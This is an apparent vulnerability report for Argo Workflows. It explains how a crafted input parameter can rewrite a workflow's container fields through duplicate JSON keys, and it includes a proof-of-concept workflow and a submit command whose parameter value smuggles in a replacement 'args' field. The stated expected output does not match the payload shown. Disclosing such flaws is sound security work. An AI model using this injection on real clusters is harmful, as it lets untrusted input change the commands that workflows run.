# Summary

It's possible to rewrite parts of a workflow on-cluster using only an input parameter. Operators who allows users to run workflows specifying input parameters are vulnerable to this.

# Details

From @mac9416 :

It's possible to rewrite parts of a workflow on-cluster using only an input parameter. This relies on taking advantage of the fact that the output of expression templates is evaluated a a literal part of the JSON-stringified template.

The following workflow accepts a string param, performs a trivial transformation (in this case, just printing it), and then passes the output as an env var to be printed.

The poisoned param value is able to overwrite "args" because 1) the golang JSON marshaler allows duplicate keys and, 2) the stringified template keys seem to be alphabetically-ordered, so the poisoned "env" value can override the original "args" field.

This is just a quick proof-of-concept. The motivated attacker could probably find a lot of different and nefarious ways to mutate a workflow.

I believe this PR would close the vulnerability: [#6285](https://github.com/argoproj/argo-workflows/pull/6285)

    # argo submit rewrite-args.yaml -p 'a="}], "args": ["echo nope"], "env": [{"name": "MESSAGE", "value": "unused'
    apiVersion: argoproj.io/v1alpha1
    kind: Workflow
    metadata:
      generateName: rewrite-args
    spec:
      entrypoint: main
      arguments:
        parameters:
          - name: a
      templates:
        - name: main
          steps:
            - - name: concat
                template: concat
            - - name: print
                template: print
                arguments:
                  parameters:
                    - name: message
                      value: "{{steps.concat.outputs.result}}"
        - name: concat
          script:
            image: debian:9.4
            command: [bash]
            env:
              - name: A
                value: "{{workflow.parameters.a}}"
            source: |
              echo "$A"
        - name: print
          inputs:
            parameters:
              - name: message
          container:
            image: debian:9.4
            command: [bash, -c]
            args:
              - echo "$MESSAGE"
            env:
              - name: MESSAGE
                value: "{{=inputs.parameters['message']}}"
    

Note: there seems to be some non-determinism involved. The expected behavior is for the "print" step to output "this happens instead". If instead you get an error, re-submit a few times.

* * *

**Message from the maintainers**:

Impacted by this bug? Give it a 👍. We prioritise the issues with the most 👍.